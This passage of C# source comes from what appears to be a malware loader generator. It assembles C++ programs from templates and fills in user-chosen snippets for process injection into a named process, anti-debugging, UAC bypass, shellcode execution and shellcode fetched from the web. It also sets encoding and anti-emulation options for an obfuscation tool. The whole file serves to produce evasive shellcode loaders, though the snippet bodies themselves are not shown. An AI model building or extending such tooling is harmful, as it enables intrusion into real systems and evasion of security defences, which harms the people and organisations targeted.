        var parameter = data.TextBoxes.TryGetValue("guardrailParamTextBox", out var rawParam)
            ? rawParam.Trim()
            : string.Empty;

        string snippet = selection.Snippet;
        bool requiresParameter =
            snippet.Contains("$guardrail_param$", StringComparison.Ordinal) ||
            snippet.Contains("__GUARDRAIL_PARAM__", StringComparison.Ordinal);

        if (requiresParameter && string.IsNullOrWhiteSpace(parameter))
            throw new InvalidOperationException("Guardrail parameter is required for the selected guardrail.");

        snippet = snippet.Replace("$guardrail_param$", parameter)
                         .Replace("__GUARDRAIL_PARAM__", parameter);

        plan.GuardrailSnippets.Add(snippet);
        CollectSnippetExtras(plan, selection);
        AddCustomSnippet(plan, placeholderName, snippet);
        LogSnippetEnabled(section.Template, selection.Id, notes);
    }

    private void ApplyProcessInjectionSelection(
        CppCompilationPlan plan,
        UiData data,
        string placeholderName,
        ICollection<string> notes)
    {
        if (!TryGetFirstSelection(data, TemplateProcessInjection, out var section, out var selection))
            return;

        if (!data.TextBoxes.TryGetValue("PsInjPsNameTextBox", out var psName) || string.IsNullOrWhiteSpace(psName))
            throw new InvalidOperationException("Process injection requires a target process name.");

        var trimmedName = psName.Trim();
        string snippet = selection.Snippet.Replace("$psname$", trimmedName);

        plan.ProcessInjectionSnippet = snippet;
        plan.ProcessLookupHelper = ProcessLookupHelper;
        CollectSnippetExtras(plan, selection);
        AddCustomSnippet(plan, placeholderName, snippet);

        LogSnippetEnabled(section.Template, selection.Id, notes);

        var note = $"Process injection target set to {trimmedName}.";
        notes.Add(note);
        _logger.Debug(note);
    }

    private void ApplyAntiDebugSelection(
        CppCompilationPlan plan,
        UiData data,
        string placeholderName,
        ICollection<string> notes)
    {
        if (!TryGetSectionSelections(data, TemplateAntiDebug, out var section, out var selections))
            return;

        foreach (var item in selections)
        {
            plan.AntiDebuggingSnippets.Add(item.Snippet);
            CollectSnippetExtras(plan, item);
            AddCustomSnippet(plan, placeholderName, item.Snippet);
            LogSnippetEnabled(section.Template, item.Id, notes);
        }
    }

    private void ApplyGenericSnippetSelection(
        CppCompilationPlan plan,
        UiData data,
        CodeTemplatePlaceholder placeholder,
        ICollection<string> notes)
    {
        if (placeholder == null)
            return;

        if (!TryGetSectionSelections(
                data,
                placeholder.SnippetTemplateKey,
                out var section,
                out var selections,
                $"Snippet section '{placeholder.SnippetTemplateKey}' referenced by placeholder '{placeholder.Name}' is missing."))
            return;

        foreach (var item in selections)
        {
            CollectSnippetExtras(plan, item);
            AddCustomSnippet(plan, placeholder.Name, item.Snippet);
            LogSnippetEnabled(section.Template, item.Id, notes);
        }
    }

    private static void AddCustomSnippet(
        CppCompilationPlan plan,
        string placeholderName,
        string snippet)
    {
        if (plan == null || string.IsNullOrWhiteSpace(placeholderName) || string.IsNullOrWhiteSpace(snippet))
            return;

        if (!plan.CustomSnippetBlocks.TryGetValue(placeholderName, out var list))
        {
            list = new List<string>();
            plan.CustomSnippetBlocks[placeholderName] = list;
        }

        var normalized = NormalizeBlock(snippet);
        if (!string.IsNullOrWhiteSpace(normalized))
            list.Add(normalized);
    }

    /// <summary>
    /// Collects the optional <c>includes</c> and <c>implementation</c> blocks from a
    /// selected snippet item into the compilation plan.
    /// </summary>
    private static void CollectSnippetExtras(CppCompilationPlan plan, CodeSnippetItem item)
    {
        if (plan == null || item == null)
            return;

        if (!string.IsNullOrWhiteSpace(item.Includes))
            plan.SnippetIncludes.Add(item.Includes);

        if (!string.IsNullOrWhiteSpace(item.Implementation))
            plan.SnippetImplementations.Add(item.Implementation);
    }

    private string RenderTemplate(CppCompilationPlan plan, CodeTemplateDefinition template)
    {
        ArgumentNullException.ThrowIfNull(template);

        var values = BuildPlaceholderValues(plan, template);
        var rendered = ApplyTemplateContent(template.Content ?? string.Empty, values);

        // Inject web payload preamble (#includes + fetch helper function) at file scope
        // before main(). The body (declarations, payload init, decode) is already in
        // {{SHELLCODE_SOURCE}} via BuildShellcodeSourceBlock.
        if (plan.UsesWebPayload && !string.IsNullOrWhiteSpace(plan.WebPayloadPreamble))
        {
            rendered = InjectWebPayloadPreamble(rendered, plan.WebPayloadPreamble);
        }

        return rendered;
    }

    private static Dictionary<string, string> BuildPlaceholderValues(CppCompilationPlan plan, CodeTemplateDefinition template)
    {
        // Map template placeholders to generated snippet blocks.
        var values = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        foreach (var entry in plan.CustomSnippetBlocks)
        {
            if (entry.Value == null || entry.Value.Count == 0)
                continue;

            var block = NormalizeBlock(string.Join(Environment.NewLine, entry.Value));
            if (!string.IsNullOrWhiteSpace(block))
                values[entry.Key] = block;
        }

        // Template preamble (shared type definitions, helper functions).
        if (!string.IsNullOrWhiteSpace(template.Preamble))
            AddPlaceholder(values, PlaceholderPreamble, template.Preamble, overwrite: true);

        // Deduplicate and inject snippet includes.
        if (plan.SnippetIncludes.Count > 0)
        {
            var uniqueLines = DeduplicateIncludeLines(plan.SnippetIncludes);
            if (!string.IsNullOrWhiteSpace(uniqueLines))
                AddPlaceholder(values, PlaceholderSnippetIncludes, uniqueLines, overwrite: true);
        }

        // Collect snippet function implementations.
        if (plan.SnippetImplementations.Count > 0)
        {
            var implBlock = NormalizeBlock(string.Join("\n\n", plan.SnippetImplementations));
            if (!string.IsNullOrWhiteSpace(implBlock))
                AddPlaceholder(values, PlaceholderSnippetImplementations, implBlock, overwrite: true);
        }

        AddPlaceholder(values, PlaceholderProcessLookupHelper, plan.ProcessLookupHelper);

        var shellcodeBlock = BuildShellcodeSourceBlock(plan);
        AddPlaceholder(values, PlaceholderShellcodeSource, shellcodeBlock, overwrite: true);

        AddHeaderBlock(values, PlaceholderShellcodeUrl, "URL-based shellcode", plan.UrlShellcodeSnippet);
        AddHeaderBlock(values, PlaceholderGuardrails, "Guardrails", plan.GuardrailSnippets);
        AddHeaderBlock(values, PlaceholderAntiDebug, "Anti-debugging", plan.AntiDebuggingSnippets);
        AddHeaderBlock(values, PlaceholderUacBypass, "UAC bypass", plan.UacBypassSnippet);
        AddHeaderBlock(values, PlaceholderProcessInjection, "Process injection", plan.ProcessInjectionSnippet);
        AddHeaderBlock(values, PlaceholderShellcodeExecution, "Shellcode execution", plan.ShellcodeExecutionSnippet);

        return values;
    }

    private static void AddHeaderBlock(
        IDictionary<string, string> values,
        string key,
        string header,
        string? content)
    {
        if (string.IsNullOrWhiteSpace(content))
            return;

        AddPlaceholder(values, key, $"// {header}{Environment.NewLine}{content}", overwrite: true);
    }

    private static void AddHeaderBlock(
        IDictionary<string, string> values,
        string key,
        string header,
        IEnumerable<string> lines)
    {
        if (lines == null)
            return;

        var content = string.Join(Environment.NewLine, lines);
        AddHeaderBlock(values, key, header, content);
    }

    private static void AddPlaceholder(
        IDictionary<string, string> values,
        string key,
        string? content,
        bool overwrite = false)
    {
        if (values == null)
            return;

        if (string.IsNullOrWhiteSpace(key))
            return;

        var normalized = NormalizeBlock(content);
        if (string.IsNullOrWhiteSpace(normalized))
            return;

        if (!overwrite && values.ContainsKey(key))
            return;

        values[key] = normalized;
    }

    private static string BuildShellcodeSourceBlock(CppCompilationPlan plan)
    {
        ArgumentNullException.ThrowIfNull(plan);

        // Web payload mode: the code block already contains only the body
        // (declarations, payload init, decode) that belongs inside main().
        // The preamble (#includes, fetch helper) is handled separately via
        // InjectWebPayloadPreamble.
        if (plan.UsesWebPayload && !string.IsNullOrWhiteSpace(plan.WebPayloadCodeBlock))
        {
            var body = plan.WebPayloadCodeBlock;
            body = PatchCapturelessLambdas(body);
            body = WrapFetchWithHexDecode(body);
            return NormalizeBlock(body);
        }

        // Prefer encoded shellcode, then generic payload, else a safe stub.
        var sb = new StringBuilder();
        if (!string.IsNullOrWhiteSpace(plan.EncodedShellcodeSnippet))
        {
            // Apply the same lambda capture fix as web payload mode - the shellcode
            // snippet may contain lambdas that need to capture local variables when
            // the template places SHELLCODE_SOURCE inside a function body.
            var snippet = PatchCapturelessLambdas(plan.EncodedShellcodeSnippet!);
            sb.AppendLine(snippet.TrimEnd());
            sb.Append("DWORD dwSize = (DWORD)code_blob_len;");
        }
        else if (plan.UsesGenericShellcode)
        {
            sb.AppendLine("DWORD dwSize = 0;");
            sb.AppendLine();
            sb.AppendLine("// Generic shellcode payload");
            var genericSnippet = plan.GenericShellcodeSnippet ?? "";
            genericSnippet = PatchCapturelessLambdas(genericSnippet);
            sb.Append(genericSnippet.TrimEnd());
        }
        else
        {
            sb.AppendLine("unsigned int code_blob_len = 0;");
            sb.AppendLine("PCHAR code_blob = nullptr;");
            sb.Append("DWORD dwSize = (DWORD)code_blob_len;");
        }

        return NormalizeBlock(sb.ToString());
    }

    /// <summary>
    /// Injects the web payload preamble (#includes, helper classes/functions) into the
    /// rendered source at file scope, right before the entry point function.
    /// The <paramref name="preamble"/> is already the file-scope block — no splitting needed.
    /// </summary>
    private static string InjectWebPayloadPreamble(string rendered, string preamble)
    {
        if (string.IsNullOrWhiteSpace(preamble))
            return rendered;

        var normalizedPreamble = NormalizeBlock(preamble);

        // Add linker pragma for MSVC (GCC uses -lwinhttp via DetectRequiredLibraries).
        if (normalizedPreamble.Contains("#include <winhttp.h>", StringComparison.OrdinalIgnoreCase) &&
            !normalizedPreamble.Contains("pragma comment", StringComparison.OrdinalIgnoreCase))
        {
            normalizedPreamble = "#pragma comment(lib, \"winhttp.lib\")\n" + normalizedPreamble;
        }

        // Append the hex-text auto-decode helper so bin2shell_maybe_decode_hex is
        // available when the body wraps the fetch call.
        normalizedPreamble += "\n" + NormalizeBlock(CppHexDecodeHelper);

        // Find the entry point function. Templates use either "INT main(VOID)" or
        // "int main()" or similar. Look for the first line that starts with
        // a function return type followed by "main".
        var lines = rendered.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);
        int mainIndex = -1;
        for (int i = 0; i < lines.Length; i++)
        {
            var trimmed = lines[i].TrimStart();
            if (Regex.IsMatch(trimmed, @"^(INT|int|VOID|void)\s+main\s*\(", RegexOptions.IgnoreCase))
            {
                mainIndex = i;
                break;
            }
        }

        if (mainIndex < 0)
        {
            // No entry point found — prepend at the top after existing includes.
            return normalizedPreamble + "\n\n" + rendered;
        }

        var sb = new StringBuilder();
        for (int i = 0; i < mainIndex; i++)
        {
            sb.AppendLine(lines[i]);
        }
        sb.AppendLine(normalizedPreamble);
        sb.AppendLine();
        for (int i = mainIndex; i < lines.Length; i++)
        {
            if (i < lines.Length - 1)
                sb.AppendLine(lines[i]);
            else
                sb.Append(lines[i]); // avoid trailing newline
        }

        return sb.ToString();
    }

    private static readonly Regex PlaceholderLineRegex = new(@"^(?<indent>\s*)\{\{(?<name>[A-Z0-9_]+)\}\}\s*$", RegexOptions.Compiled);
    private static readonly Regex InlinePlaceholderRegex = new(@"\{\{(?<name>[A-Z0-9_]+)\}\}", RegexOptions.Compiled);
    private static readonly Regex Bin2ShellPayloadLambdaRegex = new(@"(bin2shell_payload\s*=\s*)\[\s*&?\s*\](\s*\()", RegexOptions.Compiled);

    private static string ApplyTemplateContent(string content, IReadOnlyDictionary<string, string> values)
    {
        var sb = new StringBuilder();
        using var reader = new StringReader(content);
        string? line;

        while ((line = reader.ReadLine()) != null)
        {
            // Full-line placeholders map to multi-line blocks with preserved indentation.
            var match = PlaceholderLineRegex.Match(line);
            if (match.Success)
            {
                var name = match.Groups["name"].Value;
                if (!values.TryGetValue(name, out var block) || string.IsNullOrWhiteSpace(block))
                    continue;

                var indent = match.Groups["indent"].Value;
                var normalized = block.Split('\n');
                foreach (var blockLine in normalized)
                {
                    if (blockLine.Length == 0)
                    {
                        sb.AppendLine(indent);
                    }
                    else
                    {
                        sb.Append(indent);
                        sb.AppendLine(blockLine);
                    }
                }

                continue;
            }

            var replaced = InlinePlaceholderRegex.Replace(line, m =>
            {
                var name = m.Groups["name"].Value;
                if (!values.TryGetValue(name, out var inline) || string.IsNullOrEmpty(inline))
                    return string.Empty;

                return inline.Replace("\n", Environment.NewLine);
            });

            sb.AppendLine(replaced);
        }

        return sb.ToString();
    }

    private static string NormalizeBlock(string? content)
    {
        if (string.IsNullOrWhiteSpace(content))
            return string.Empty;

        return content
            .Replace("\r\n", "\n", StringComparison.Ordinal)
            .Replace('\r', '\n')
            .TrimEnd();
    }

    /// <summary>
    /// Merges multiple include blocks into a single deduplicated block.
    /// Each <c>#include</c> or <c>#pragma</c> line appears at most once.
    /// </summary>
    private static string DeduplicateIncludeLines(IEnumerable<string> blocks)
    {
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var result = new List<string>();

        foreach (var block in blocks)
        {
            if (string.IsNullOrWhiteSpace(block))
                continue;

            foreach (var rawLine in block.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None))
            {
                var trimmed = rawLine.Trim();
                if (string.IsNullOrWhiteSpace(trimmed))
                    continue;

                if (seen.Add(trimmed))
                    result.Add(trimmed);
            }
        }

        return string.Join("\n", result);
    }

    private IReadOnlyList<CodeSnippetItem> ResolveSnippetSelections(UiData data, CodeSnippetSection section)
    {
        ArgumentNullException.ThrowIfNull(data);
        ArgumentNullException.ThrowIfNull(section);

        var matches = new List<(int Index, CodeSnippetItem Item)>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var entry in data.ComboBoxes)
        {
            if (!SnippetControlNaming.TryMatchComboName(section, entry.Key, out var index))
                continue;

            var rawId = entry.Value?.Trim();
            if (string.IsNullOrWhiteSpace(rawId))
                continue;

            if (!section.TryGetItem(rawId, out var item))
            {
                _logger.Warn($"Snippet '{rawId}' not found in section '{section.Display}'.");
                continue;
            }

            if (seen.Add(item.Id))
            {
                matches.Add((index, item));
            }
        }

        foreach (var entry in data.ListBoxes)
        {
            if (!SnippetControlNaming.TryMatchListName(section, entry.Key, out var listIndex))
                continue;

            var selectedValues = entry.Value;
            if (selectedValues == null || selectedValues.Count == 0)
                continue;

            var selectedSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var value in selectedValues)
            {
                if (string.IsNullOrWhiteSpace(value))
                    continue;

                selectedSet.Add(value.Trim());
            }

            if (selectedSet.Count == 0)
                continue;

            int order = 0;
            foreach (var option in section.Items)
            {
                if (!selectedSet.Contains(option.Id))
                    continue;

                if (seen.Add(option.Id))
                {
                    matches.Add((listIndex * 1000 + order, option));
                }

                order++;
            }
        }

        return matches
            .OrderBy(m => m.Index)
            .Select(m => m.Item)
            .ToList();
    }

    private void LogSnippetEnabled(string sectionName, string itemId, ICollection<string> notes)
    {
        var message = $"Enabled {sectionName}:{itemId}.";
        notes.Add(message);
        _logger.Debug(message);
    }

    private IReadOnlyList<string> BuildBin2ShellArguments(UiData data, string shellcodeFile)
    {
        var args = new List<string>();

        if (!string.IsNullOrWhiteSpace(_paths.Bin2ShellAlgos) && File.Exists(_paths.Bin2ShellAlgos))
        {
            args.Add("-y");
            args.Add(_paths.Bin2ShellAlgos);
        }

        if (TryGetEncoderIndex(data, out int encoderIndex))
        {
            args.Add("-e");
            args.Add(encoderIndex.ToString(CultureInfo.InvariantCulture));
        }

        if (TryGetEnvelopeIndex(data, out int envelopeIndex))
        {
            args.Add("-v");
            args.Add(envelopeIndex.ToString(CultureInfo.InvariantCulture));
        }

        var antiSelection = GetAntiEmulationSelection(data);
        var antiArgs = GetAntiEmulationArgs(data);

        if (!string.IsNullOrWhiteSpace(antiSelection))
        {
            args.Add("-ae");
            args.Add(antiSelection!);

            if (!string.IsNullOrWhiteSpace(antiArgs))
            {
                args.Add(antiArgs!);
            }
        }

        args.Add(shellcodeFile);
        return args;
    }

    private static bool TryGetEncoderIndex(UiData data, out int index)
    {
        index = 0;

        foreach (var key in EncoderKeys)
        {
            if (data.ComboBoxes.TryGetValue(key, out var raw) && TryParseIndex(raw, out index) && index > 0)
                return true;
        }

        foreach (var entry in data.ComboBoxes)
        {
            var key = entry.Key ?? string.Empty;
            if (key.IndexOf("bin2", StringComparison.OrdinalIgnoreCase) < 0)
                continue;
            if (key.IndexOf("enc", StringComparison.OrdinalIgnoreCase) < 0 &&
                key.IndexOf("codec", StringComparison.OrdinalIgnoreCase) < 0)
                continue;

            if (TryParseIndex(entry.Value, out index) && index > 0)
                return true;
        }

        index = 0;
        return false;
    }

    private static bool TryGetEnvelopeIndex(UiData data, out int index)
    {
        index = 0;

        foreach (var key in EnvelopeKeys)
        {
            if (data.ComboBoxes.TryGetValue(key, out var raw) && TryParseIndex(raw, out index) && index > 0)
                return true;
        }

        foreach (var entry in data.ComboBoxes)
        {
            var key = entry.Key ?? string.Empty;
            if (key.IndexOf("bin2", StringComparison.OrdinalIgnoreCase) < 0)
                continue;
            if (key.IndexOf("env", StringComparison.OrdinalIgnoreCase) < 0 &&
                key.IndexOf("envelope", StringComparison.OrdinalIgnoreCase) < 0)
                continue;

            if (TryParseIndex(entry.Value, out index) && index > 0)
                return true;
        }

        index = 0;
        return false;
    }

    private static string? GetAntiEmulationSelection(UiData data)
    {
        foreach (var key in AntiEmulationSelectionKeys)
        {
            if (!data.ComboBoxes.TryGetValue(key, out var raw))
                continue;

            var parsed = ParseAntiEmulationToken(raw);
            if (!string.IsNullOrWhiteSpace(parsed))
                return parsed;
        }

        foreach (var entry in data.ComboBoxes)
        {
            var key = entry.Key ?? string.Empty;
            // Skip snippet combo boxes — those are template placeholder selectors, not bin2shell options.
            if (key.StartsWith("snippetCombo_", StringComparison.OrdinalIgnoreCase))
                continue;
            if (key.IndexOf("anti", StringComparison.OrdinalIgnoreCase) < 0 &&
                key.IndexOf("emulation", StringComparison.OrdinalIgnoreCase) < 0)
            {
                continue;
            }

            var parsed = ParseAntiEmulationToken(entry.Value);
            if (!string.IsNullOrWhiteSpace(parsed))
                return parsed;
        }

        return null;
    }

    private static string? ParseAntiEmulationToken(string? value)
    {
        if (string.IsNullOrWhiteSpace(value))
            return null;

        var trimmed = value.Trim();

        if (TryParseIndex(trimmed, out int index) && index > 0)
            return index.ToString(CultureInfo.InvariantCulture);

        int dash = trimmed.IndexOf('-');
        if (dash >= 0 && dash + 1 < trimmed.Length)
        {
            var tail = trimmed[(dash + 1)..].Trim();
            if (tail.Length == 0)
                return null;

            int pipe = tail.IndexOf('|');
            if (pipe >= 0)
                tail = tail[..pipe].Trim();

            return tail.Length > 0 ? tail : null;
        }

        int pipeOnly = trimmed.IndexOf('|');
        if (pipeOnly >= 0)
        {
            var head = trimmed[..pipeOnly].Trim();
            if (TryParseIndex(head, out index) && index > 0)
                return index.ToString(CultureInfo.InvariantCulture);
            if (head.Length > 0)
                return head;
        }

        return trimmed;
    }

    private static string? GetAntiEmulationArgs(UiData data)
    {
        foreach (var key in AntiEmulationArgsKeys)
        {
            if (!data.TextBoxes.TryGetValue(key, out var raw))
                continue;

            var normalized = NormalizeAntiEmulationArgs(raw);
            if (!string.IsNullOrWhiteSpace(normalized))
                return normalized;
        }

        foreach (var entry in data.TextBoxes)
        {
            var key = entry.Key ?? string.Empty;
            if (key.IndexOf("bin2", StringComparison.OrdinalIgnoreCase) < 0 ||
                key.IndexOf("arg", StringComparison.OrdinalIgnoreCase) < 0)
            {
                continue;
            }

            var normalized = NormalizeAntiEmulationArgs(entry.Value);
            if (!string.IsNullOrWhiteSpace(normalized))
                return normalized;
        }

        return null;
    }

    private static string? NormalizeAntiEmulationArgs(string? raw)
    {
        if (string.IsNullOrWhiteSpace(raw))
            return null;

        var noNewLines = raw.Replace("\r", string.Empty).Replace("\n", string.Empty).Trim();
        if (noNewLines.Length == 0)
            return null;

        var segments = noNewLines
            .Split(':', StringSplitOptions.RemoveEmptyEntries)
            .Select(segment => segment.Trim())
            .Where(segment => segment.Length > 0)
            .ToArray();

        if (segments.Length == 0)
            return null;

        return string.Join(":", segments);
    }

    private static bool TryParseIndex(string? raw, out int index)
    {
        index = 0;
        if (string.IsNullOrWhiteSpace(raw))
            return false;

        raw = raw.Trim();

        var matchedByName = TryResolveAlgorithmIndexByName(raw);
        if (matchedByName > 0)
        {
            index = matchedByName;
            return true;
        }

        int idxEq = raw.IndexOf("Index", StringComparison.OrdinalIgnoreCase);
        if (idxEq >= 0)
        {
            int colon = raw.IndexOf(':', idxEq);
            if (colon >= 0 && int.TryParse(raw.AsSpan(colon + 1).Trim(), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
                return true;
        }

        int eq = raw.IndexOf('=');
        if (eq >= 0)
        {
            int start = eq + 1;
            while (start < raw.Length && char.IsWhiteSpace(raw[start])) start++;
            int end = start;
            while (end < raw.Length && char.IsDigit(raw[end])) end++;
            if (end > start && int.TryParse(raw.AsSpan(start, end - start), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
                return true;
        }

        int dash = raw.IndexOf('-');
        string head = (dash >= 0 ? raw[..dash] : raw).Trim();
        if (int.TryParse(head, NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
            return true;

        for (int k = 0; k < raw.Length; k++)
        {
            if (!char.IsDigit(raw[k])) continue;
            int start = k;
            int end = k;
            while (end < raw.Length && char.IsDigit(raw[end])) end++;
            if (int.TryParse(raw.AsSpan(start, end - start), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
                return true;
            k = end;
        }

        index = 0;
        return false;
    }

    private static int TryResolveAlgorithmIndexByName(string raw)
    {
        if (string.IsNullOrWhiteSpace(raw))
            return 0;

        string candidate = raw.Trim();

        // Reject well-known aliases that are labels, not Bin2Shell algorithm IDs.
        if (string.Equals(candidate, "none", StringComparison.OrdinalIgnoreCase))
            return 0;

        // Encoder names
        if (string.Equals(candidate, "xor42", StringComparison.OrdinalIgnoreCase))
            return 1;
        if (string.Equals(candidate, "rc4", StringComparison.OrdinalIgnoreCase))
            return 2;
        if (string.Equals(candidate, "xor_key", StringComparison.OrdinalIgnoreCase))
            return 3;
        if (string.Equals(candidate, "caesar", StringComparison.OrdinalIgnoreCase))
            return 4;
        if (string.Equals(candidate, "rol3", StringComparison.OrdinalIgnoreCase))
            return 5;

        // Envelope names
        if (string.Equals(candidate, "base91", StringComparison.OrdinalIgnoreCase))
            return 1;
        if (string.Equals(candidate, "base64", StringComparison.OrdinalIgnoreCase))
            return 2;
        if (string.Equals(candidate, "base32", StringComparison.OrdinalIgnoreCase))
            return 3;
        if (string.Equals(candidate, "hex", StringComparison.OrdinalIgnoreCase))
            return 4;
        if (string.Equals(candidate, "base58", StringComparison.OrdinalIgnoreCase))
            return 5;
        if (string.Equals(candidate, "base85", StringComparison.OrdinalIgnoreCase))
            return 6;
        if (string.Equals(candidate, "ipv4_array", StringComparison.OrdinalIgnoreCase))
            return 7;
        if (string.Equals(candidate, "mac_array", StringComparison.OrdinalIgnoreCase))
            return 8;
        if (string.Equals(candidate, "uuid_array", StringComparison.OrdinalIgnoreCase))
            return 9;
        if (string.Equals(candidate, "base32hex", StringComparison.OrdinalIgnoreCase))
            return 10;

        return 0;
    }

    private ShellcodeSource DetermineShellcodeSource(UiData data)
    {
        // Check for web payload injected by the coordinator.
        if (data.TextBoxes.TryGetValue("__webPayloadCodeBlock__", out var webBlock) &&
            !string.IsNullOrWhiteSpace(webBlock))
        {
            return new ShellcodeSource(ShellcodeSourceKind.WebPayload, webBlock);
        }

        data.TextBoxes.TryGetValue("shellcodeFile", out var filePathRaw);
        data.TextBoxes.TryGetValue("shellcodeRAW", out var rawInput);
        data.TextBoxes.TryGetValue("shellcodeURL", out var urlInput);
        data.ComboBoxes.TryGetValue("genericShellcodeComboBox", out var genericSelection);

        bool hasFile = !string.IsNullOrWhiteSpace(filePathRaw);
        bool hasRaw = !string.IsNullOrWhiteSpace(rawInput);
        bool hasUrl = !string.IsNullOrWhiteSpace(urlInput);
        bool hasGeneric = !string.IsNullOrWhiteSpace(genericSelection);

        int selected = new[] { hasFile, hasRaw, hasUrl, hasGeneric }.Count(x => x);

        if (selected == 0)
            return new ShellcodeSource(ShellcodeSourceKind.None, string.Empty);
        if (selected > 1)
            throw new InvalidOperationException("Multiple shellcode sources detected. Provide only one.");

        if (hasFile) return new ShellcodeSource(ShellcodeSourceKind.File, filePathRaw!.Trim());
        if (hasRaw) return new ShellcodeSource(ShellcodeSourceKind.Raw, rawInput!.Trim());
        if (hasUrl) return new ShellcodeSource(ShellcodeSourceKind.Url, urlInput!.Trim());
        if (hasGeneric) return new ShellcodeSource(ShellcodeSourceKind.Generic, genericSelection!.Trim());

        throw new InvalidOperationException("Unable to resolve the selected shellcode source.");
    }

    private string SaveRawHexToBin(string raw)
    {
        if (string.IsNullOrWhiteSpace(raw))
            throw new ArgumentException("Raw hex input is required.", nameof(raw));

        byte[] bytes;
        var matches = Regex.Matches(raw, "\\\\x([0-9A-Fa-f]{2})");
        if (matches.Count > 0)
        {
            bytes = new byte[matches.Count];
            for (int i = 0; i < matches.Count; i++)
            {
                bytes[i] = Convert.ToByte(matches[i].Groups[1].Value, 16);
            }
        }
        else
        {
            var hexOnly = new string(raw.Where(Uri.IsHexDigit).ToArray());
            if (hexOnly.Length == 0)
                throw new FormatException("Input does not appear to be hex-encoded.");
            if (hexOnly.Length % 2 != 0)
                throw new FormatException("Hex input must contain an even number of digits.");

            bytes = new byte[hexOnly.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hexOnly.Substring(i * 2, 2), 16);
            }
        }

        using var sha = SHA256.Create();
        var hash = sha.ComputeHash(bytes);
        var sb = new StringBuilder(hash.Length * 2);
        foreach (var b in hash)
            sb.Append(b.ToString("x2"));
        string hashHex = sb.ToString();

        string dir = _paths.EnsureTempShellcodeDirectory();
        Directory.CreateDirectory(dir);

        string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss", CultureInfo.InvariantCulture);
        string fileName = $"{hashHex}_{timestamp}.bin";
        string path = Path.Combine(dir, fileName);

        File.WriteAllBytes(path, bytes);
        _logger.Debug($"Raw shellcode persisted to {path}.");
        return path;
    }

    private static string QuoteArg(string value)
    {
        if (string.IsNullOrEmpty(value))
            return "\"\"";

        return value.IndexOfAny(new[] { ' ', '\t', '"' }) >= 0
            ? $"\"{value.Replace("\"", "\\\"")}\""
            : value;
    }

    private static string EscapeForCxxString(string value)
        => value.Replace("\\", "\\\\").Replace("\"", "\\\"");


    private sealed record ShellcodeSource(ShellcodeSourceKind Kind, string Value);

    private enum ShellcodeSourceKind
    {
        None,
        File,
        Raw,
        Url,
        Generic,
        WebPayload
    }
}
